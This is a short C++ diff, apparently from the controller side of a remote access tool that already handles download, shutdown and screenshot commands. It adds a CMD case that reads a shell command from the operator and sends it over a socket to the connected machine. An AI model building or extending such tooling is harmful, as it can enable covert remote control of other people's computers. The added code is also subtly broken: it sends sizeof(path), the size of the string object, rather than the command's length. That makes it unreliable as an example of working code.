@@ -38,7 +38,8 @@ enum commands {
 	DOWNLOAD,
 	SHUTDOWN,
 	ERR,
-	SCREENCAP
+	SCREENCAP,
+	CMD
 };
 
 int main() {
@@ -291,6 +292,13 @@ int main() {
 					timenow();
 					std::cout << " null screenshot";
 				}
+				break;
+			case CMD:
+				send(conn, "cmd", 3, NULL);
+				std::cout << "enter cmd command > ";
+				std::getline(std::cin, path);
+				send(conn, path.c_str(), sizeof(path), NULL);
+				std::cout << "ok\n";
 				break;
 
 			default:
